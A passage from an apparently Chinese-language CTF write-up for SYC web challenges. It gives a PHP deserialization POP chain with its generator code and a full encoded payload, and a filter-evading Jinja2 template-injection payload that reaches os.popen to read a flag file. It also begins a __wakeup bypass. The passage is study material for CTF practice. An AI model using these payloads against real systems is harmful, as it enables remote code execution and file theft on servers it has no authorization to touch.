invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$a</span>])===<span class="hljs-string">&#x27;key.php&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;key.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure>

<p>然后我们需要传入一个a，</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">案例网址：https:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] 	得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br></code></pre></td></tr></table></figure>

<p>$_SERVER[‘REQUEST_URI’]又不能存在key.php，所以我们传入a&#x3D;PHP_SELF</p>
<p>然后在当前的url网址后面加上&#x2F;key.php即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://e3kdaoip15ici39mafpbux8qb.node.game.sycsec.com/havefun.php<br>改为<br>https://e3kdaoip15ici39mafpbux8qb.node.game.sycsec.com/havefun.php/key.php<br></code></pre></td></tr></table></figure>

<p>最终的php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">useless</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$seeyou</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=NAN;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$YXX</span>=NAN;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">useless</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//e<span class="hljs-number">3</span>kdaoip<span class="hljs-number">15</span>ici<span class="hljs-number">39</span>mafpbux<span class="hljs-number">8</span>qb.node.game.sycsec.com/havefun.php/key.php?user<span class="hljs-operator">=</span>C<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ArrayIterator<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">89</span><span class="hljs-variable">%3</span>A&#123;<span class="hljs-keyword">x</span><span class="hljs-variable">%3</span>Ai<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>useless<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A&#123;s<span class="hljs-variable">%3</span>A<span class="hljs-number">15</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>useless<span class="hljs-variable">%00</span>seeyou<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>QW<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bd<span class="hljs-variable">%3</span>ANAN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>YXX<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bd<span class="hljs-variable">%3</span>ANAN<span class="hljs-variable">%3</span>B&#125;<span class="hljs-variable">%3</span>Bm<span class="hljs-variable">%3</span>Aa<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A&#123;&#125;&#125;&amp;a<span class="hljs-operator">=</span>PHP_SELF<br></code></pre></td></tr></table></figure>

<p>拿到了一大串base64加密后的东西，拿去解密之后发现是图片，查看图片找到密钥</p>
<p>key&#x3D;9</p>
<p>hername&#x3D;momo</p>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>分析pop链，在her 类中，找到我们的终点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fun&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>应该是php原生类读文件，我们一步一步从终点反推：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;r&#x27;</span>) === <span class="hljs-string">&quot;loveyou&quot;</span>))<br></code></pre></td></tr></table></figure>

<p>这里可以用data伪协议进入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,bG92ZXlvdQ==<br></code></pre></td></tr></table></figure>

<p>然后需要密钥和她的名字：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$this</span>-&gt;hername,<span class="hljs-variable">$this</span>-&gt;key) === <span class="hljs-string">&#x27;vxvx&#x27;</span>) &#123;<br></code></pre></td></tr></table></figure>

<p>我们需要在另一部分去拿。</p>
<p>然后以上这些东西都在find这个方法里，我们需要进入这个方法，并且因为里面使用了$this，所以只能动态调用该方法，这个后面说。</p>
<p>找到唯一可以调用函数的地方：</p>
<p>useless类中有get方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$good</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$zhui</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$good</span>;  <br>        <span class="hljs-variable">$zhui</span>[<span class="hljs-variable">$good</span>]();  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>而能触发get方法的是important类中的sleep方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;睡饱了，接着找！&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;power-&gt;seeyou;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在直接获取私有成员属性得时候，自动调用了这个__get()方法，这里的seeyou是私有属性，所以会调用get，进入get之后，$good就是触发get方法的属性名，即seeyou，所以get当中关键句就变成了</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">seeyou<span class="hljs-selector-attr">[seeyou]</span>();<br></code></pre></td></tr></table></figure>

<p>我们需要修改seeyou这个数组当中的seeyou的键值，从而调用find函数。</p>
<p>原来尝试过静态调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$seeyou</span>=[<span class="hljs-string">&quot;seeyou&quot;</span>=&gt;<span class="hljs-string">&quot;her::find&quot;</span>];<br></code></pre></td></tr></table></figure>

<p>但是不成功，只能动态调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$seeyou</span>=[<span class="hljs-string">&quot;seeyou&quot;</span>=&gt;[<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">her</span>(), <span class="hljs-string">&quot;find&quot;</span>]];<br></code></pre></td></tr></table></figure>

<p>接着回到链子，现在需要触发sleep方法，当序列化的时候会自动触发，在her类中有序列化函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;好累，好想睡一觉啊&lt;br&gt;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$this</span>-&gt;asd);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>现在需要进入invoke方法，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。在Me类中找到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>	<span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;qwe;        <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();<br></code></pre></td></tr></table></figure>

<p>而wakeup会自动执行。</p>
<p>所以我们的pop链就出来了：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">new</span> Me<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__wakeup<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> her<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__invoke<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> important<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__sleep<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> useless<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__get<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> her<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>find()<br></code></pre></td></tr></table></figure>

<p>最终php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Me</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwe</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bro</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">her</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$hername</span> = <span class="hljs-string">&#x27;momo&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;9&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asd</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">important</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$power</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">useless</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$seeyou</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$YXX</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$seeyou</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;seeyou = <span class="hljs-variable">$seeyou</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Me</span>();<br><span class="hljs-variable">$b</span>-&gt;bro = &amp;<span class="hljs-variable">$b</span>-&gt;secret;<br><span class="hljs-variable">$b</span>-&gt;qwe = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">her</span>();<br><span class="hljs-variable">$b</span>-&gt;qwe-&gt;asd = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">important</span>();<br><span class="hljs-variable">$b</span>-&gt;qwe-&gt;asd-&gt;power = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">useless</span>([<span class="hljs-string">&quot;seeyou&quot;</span>=&gt;[<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">her</span>(), <span class="hljs-string">&quot;find&quot;</span>]]);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p>最后是原生类读文件，当我们想要读取到某个文件时，我们就可以利用SplFileInfo或者SplFileObject类来对文件进行操作。这内置类也只能读取第一行，同样我们可以使用foreach把它们全部都打印出来。</p>
<p>但是这里我们可没有foreach函数可以用，只能读取文件名，所以尝试目录遍历</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/125045832">https://blog.csdn.net/m0_62422842/article/details/125045832</a></p>
<p>我们用FilesystemIterator扫描一下当前目录第一个文件（只能第一个&#x3D;-&#x3D;）</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span>=/<span class="hljs-keyword">var</span>/www/html/</span><br>ctf=FilesystemIterator<br></code></pre></td></tr></table></figure>

<p>拿到一个文件名flag_my_baby.php ，打开康康，找到flag</p>
<p>SYC{jUHzFBdyEKq2lySHks}</p>
<p>最终payload：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">?user=C%3A13%3A%22ArrayIterator%22%3A366%3A%7Bx%3Ai%3A0%3BO%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;<span class="hljs-keyword">file</span>=data:<span class="hljs-comment">//text/plain;base64,bG92ZXlvdQ==&amp;fun=/var/www/html/</span><br><br>POST：ctf=FilesystemIterator<br></code></pre></td></tr></table></figure>





<h2 id="klf-2-klf-3"><a href="#klf-2-klf-3" class="headerlink" title="klf_2&amp;klf_3"></a>klf_2&amp;klf_3</h2><p>klf_2的payload复制到klf_3里同样适用&#x3D;-&#x3D;</p>
<p>在&#x2F;robots.txt里找到&#x2F;secr3ttt</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
<p>这道题过滤了很多关键字，经过测试，留下一个列表可以让我们取用需要的字符</p>
<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> orglst = (&#123; &#125;|select|string|list) %&#125;</span><span class="language-xml">&#123;&#125;orglst&#125;&#125;</span><br><span class="language-xml">在这里取到下划线和空格</span><br></code></pre></td></tr></table></figure>

<p>可以通过下列语句构造关键字</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% <span class="hljs-built_in">set</span> pon = dict(po=aa,pen=<span class="hljs-built_in">dd</span>)|<span class="hljs-built_in">join</span> %&#125;    <span class="hljs-comment"># popen</span><br></code></pre></td></tr></table></figure>

<p>直接上payload</p>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> po = dict(po=aa,p=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">             #pop</span><br><span class="language-xml">pop被过滤了，构造出pop后用|attr(po)代替 .pop</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> xhx = ((&#123; &#125;<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">24</span>)<span class="hljs-punctuation">|</span>string) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">      #_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> kong = ((&#123; &#125;<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">17</span>)<span class="hljs-punctuation">|</span>string) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">     #空格</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> point = ((g<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">6</span>)<span class="hljs-punctuation">|</span>string) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">  //g是全局变量，代表flask这个实例 #.</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> claz= dict(cla=aa,ss=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#class</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> clazz=(xhx,xhx,claz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">					#__class__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> baz = dict(ba=aa,se=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#base</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bazz=(xhx,xhx,baz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#__base__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> subz = dict(subc=aa,lasses=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">				#subclasses</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> subzz=(xhx,xhx,subz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">					#__subclasses__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> getz= dict(geti=aa,tem=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">					#getitem</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> getzz=(xhx,xhx,getz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">					#__getitem__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> inz= dict(<span class="hljs-keyword">in</span>=aa,it=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#init</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> inzz=(xhx,xhx,inz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#__init__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> glo= dict(glo=aa,bals=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#globals</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> glob=(xhx,xhx,glo,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#__globals__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> xi=()<span class="hljs-punctuation">|</span>attr(clazz)<span class="hljs-punctuation">|</span>attr(bazz)<span class="hljs-punctuation">|</span>attr(subzz)()<span class="hljs-punctuation">|</span>attr(getzz)(<span class="hljs-number">279</span>)<span class="hljs-punctuation">|</span>attr(inzz)<span class="hljs-punctuation">|</span>attr(glob)<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>attr(getzz)(<span class="hljs-number">69</span>) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">       #/        //从另一个表里拿到斜杠</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> oz= dict(o=aa,s=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">							#os</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> pom= dict(po=aa,pen=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">						#popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> re= dict(re=aa,ad=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">							#read</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ca= dict(c=aa,at=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">							#cat</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> f= dict(fl<span class="hljs-number">4</span>gf=aa,l<span class="hljs-number">4</span>gfl<span class="hljs-number">4</span>g=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">					#fl4gfl4gfl4g</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> payload=(ca,kong,point,point,xi,point,point,xi,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">#cat ../../fl4gfl4gfl4g</span><br><span class="language-xml">&#123;&#125;()|attr(clazz)|attr(bazz)|attr(subzz)()|attr(getzz)(279)|attr(inzz)|attr(glob)|attr(getzz)(oz)|attr(pom)(payload)|attr(re)()&#125;&#125;</span><br><span class="language-xml">#().__class__.__base__.__subclasses__.__getitem__(279).__init__.__globals__.__getitem__(oz).popen(cat ../../fl4gfl4gfl4g).read()</span><br></code></pre></td></tr></table></figure>

<p>__getitem__(279)为[279]</p>
<p>SYC{YARCu1gP5RLkoNNwcI}</p>
<h2 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h2><p>这道题要我们猜测flag所在文件的名字，根据不同的回显，相当于盲注。</p>
<p>我们要一步一步猜测文件名，所以要绕过wakeup</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$b</span> <span class="hljs-operator">=</span> str_replace(<span class="hljs-string">&quot;Hoshino<span class="hljs-subst">\&quot;</span>:1&quot;</span>,<span class="hljs-string">&quot;Hoshino<span class="hljs-subst">\&quot;</span>:2&quot;</span>,<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>

<p>调用call方法</p>
